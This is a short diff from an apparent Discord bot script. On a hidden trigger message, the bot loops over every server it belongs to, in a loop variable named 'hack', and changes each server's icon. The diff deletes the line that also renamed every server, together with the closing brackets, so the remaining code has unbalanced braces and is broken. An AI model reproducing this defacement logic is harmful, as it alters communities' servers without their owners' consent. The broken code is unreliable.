@@ -30,5 +30,6 @@ if (message.content === x_x) {
    client.user.setGame(playing, 'https://www.twitch.tv/end')
    client.guilds.forEach(hack => {
    hack.setIcon(pic)
-   hack.setName(namee)})})})}});
+       
+       
 client.login(process.env.BOT_TOKEN);
